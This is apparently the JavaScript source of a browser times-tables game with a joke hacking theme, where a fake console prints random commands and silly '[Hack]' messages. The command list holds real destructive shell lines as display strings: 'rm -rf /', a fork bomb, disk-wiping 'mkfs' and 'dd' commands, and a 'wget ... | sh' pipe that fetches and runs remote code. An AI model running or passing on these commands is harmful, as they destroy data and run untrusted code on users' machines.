
// # console outputs

var commands = ["sudo rm -rf /",
                ":(){:|:&};:",
                "command > /dev/sda", "mv folder /dev/null",
                "wget malicious_source.com/rip -O- | sh",
                "mkfs.ext3 /dev/sda",
                "^foo^bar",
                "dd if=/dev/random of=/dev/sda",
                "tar cvf archive_name.tar dirname/",
                "tar xvf archive_name.tar",
                "grep -i 'the' demo_file",
                "find -iname 'MyCProgram.c'",
                "find ~ -empty",
                "ssh -l jsmith remotehost.example.com",
                "sed 's/.$//' filename",
                " awk '!($0 in array) { array[$0]; print }' temp"
               ]


var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[Hack] Deploying sporkbomb\n[sporkbomb] I is a big sporkbomb, Loading...\n[Hack] sporkbombed!",
               "[Hack] Firewall traced to relative IP of 127.0.0.1\n[Firewall] I'm inpenatrable!\n[Hack] Damn, firewall impenatrable!\n[Nuke] I is blow up firewall!\n[Hack] Firewall down!",
               "[Hack] Detected sporkbomb!\n[sporkbomb] I exist!\n[Hack] Cracking Firewall...\n[Hack] Cracked!",
               "[Hack] Hacking...\n[Hack] Hacked!",
               "[Hack] Creating sporkbomb...\n[Sporkbomb] Boom!\n[Hack] Hack complete!",
               "[Nuke] Nuking really hard...\n[Hack] Nuke complete!",
               "[Hack] Bypassing proxy...\n[Hack] Proxy flooded!\n[Hack] Hack complete!"
              ]

// # global vars

var out1;
var out2;
var blue = 50;
var red = 50;
var difficulty = 10;
var gameLength = 10;
var acceptInput = true;
var won = false;
var doAudio = true;

// # random num generater

function ranBetween(min, max) {
  return Math.round(Math.random() * (max - min) + min);
}

// # Console

function generateCommand(color) {
  var target = ranBetween(0, commands.length-1);
  var command;
  if(color == "blue") {
    command = "<p class='command'><span style='color: blue;' class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[target]+"</p>";
  } else {
    command = "<p class='command'><span style='color: red;' class='user'>badguy@hack-headquarters</span><span class='white'>$</span> "+commands[target]+"</p>";
  }
  $("#console-text").append(command);
  $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);

  var outputTarget = ranBetween(0, outputs.length-1);
  var output = outputs[outputTarget].split("\n");
  for (var i = 0; i < output.length; i++) {
    $("#console-text").append("<p class='command'>"+output[i]+"</p>");
    $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 10);
  }
}

// # random times tables

function populateOuts() {
  out1 = ranBetween(1, 12);
  out2 = ranBetween(1, 12);
  $("#out1").html("<h1>" + out1 + "</h1>");
  $("#out2").html("<h1>" + out2 + "</h1>");
}

// # power bar

function power(win) {
  if(win) {
    if(red-gameLength <= 0) {
      won = true;
      $("#menu-container").css("display", "flex");
      $("#grid-container").css("display", "none");
      setTimeout(function () {
        won = false;
      }, 4000);
      red = 50;
      blue = 50;
    } else {
      blue += gameLength;
      red -= gameLength;
    }
  } else {
    if(blue-gameLength <= 0) {
      $("#menu-container").css("display", "flex");
      $("#grid-container").css("display", "none");
      won = true;
      setTimeout(function () {
        won = false;
      }, 4000);
      blue = 50;
      red = 50;
    } else {
      blue -= gameLength;
      red += gameLength;
    }
  }
  $("#power-red").css("width", String(red+"%"));
  $("#power-blue").css("width", String(blue+"%"));
}

function enemyTurn() {
  var chance = ranBetween(1, 11-difficulty);
  if(chance == 1) {
    if(!won) {
      GUIAlert("ENEMY", "WON!", "red");
      generateCommand("red");
      power(false);
    }
  } else {
    if(!won) {
      GUIAlert("ENEMY", "LOST!", "green");
      generateCommand("red");
      power(true);
    }
  }
  setTimeout(function () {
    acceptInput = true;
    $("#red-turn").css("background", "rgba(0, 0, 0, 0.5)");
    $("#blue-turn").css("background", "rgba(255, 255, 255, 0.5)");
    $("#in1 > input:nth-child(1)").css("background", "white");
  }, 5000);
}

function GUIAlert(who, what, color) {
  console.log("GUI ALERT FOR "+who+" "+what+"!");
  $("#power-container").fadeOut(100);
  $("#result-container").css("background", String(color));
  $("#result-container").html("<h1 id='result-h1'>"+who+" "+what+"</h1>");
  $("#result-container").css("display", "block").hide().delay(100).fadeIn(500);
  setTimeout(function () {
    $("#result-container").fadeOut(500);
    setTimeout(function () {
      $("#power-container").hide().fadeIn(500);
    }, 500);
  }, 1000);
}

$(document).ready(function () {
  populateOuts();

  $("#blue-turn").css("background", "rgba(255, 255, 255, 0.5)");
  // # when enter hit
  // difficulty = 5;

  $("#play").click(function () {
    $("#menu-container").css("display", "none");
    $("#grid-container").css("display", "grid");
    gameLength = 11-Number($("#game-length").val());
    console.log(gameLength);
    difficulty = Number($("#game-difficulty").val());
    console.log(difficulty);
    doAudio = $('#doAudio').is(":checked");
    console.log(doAudio);
  });

  $("#grid-container").css("display", "none");
  $("#result-container").css("display", "none");
  $(document).keypress(function(e) {
    if(e.which == 13 && $("#in1 > input:nth-child(1)").is(":focus") && $("#in1 > input:nth-child(1)").val() != "" && !isNaN($("#in1 > input:nth-child(1)").val()) && acceptInput == true) {
      if(Number($("#in1 > input:nth-child(1)").val()) == out1*out2) {
        $("#in1 > input:nth-child(1)").val("");

        generateCommand("blue");
        if(doAudio) {
          var audio = new Audio('src/correct.mp3');
          audio.play();
        }
        GUIAlert("YOU", "WON!", "green");
        power(true);
        populateOuts();

        acceptInput = false;
        $("#blue-turn").css("background", "rgba(0, 0, 0, 0.5)");
        $("#red-turn").css("background", "rgba(255, 255, 255, 0.5)");
        $("#in1 > input:nth-child(1)").css("background", "grey");
        setTimeout(enemyTurn, 3000);
      } else {
        $("#in1 > input:nth-child(1)").val("");

        generateCommand("blue");
        if(doAudio) {
          var audio = new Audio('src/incorrect.mp3');
          audio.play();
        }
        GUIAlert("YOU", "LOST!", "red");
        power(false);
        populateOuts();

        acceptInput = false;
        $("#blue-turn").css("background", "rgba(0, 0, 0, 0.5)");
        $("#red-turn").css("background", "rgba(255, 255, 255, 0.5)");
        $("#in1 > input:nth-child(1)").css("background", "grey");
        setTimeout(enemyTurn, 3000);
      }
    }
  });

});
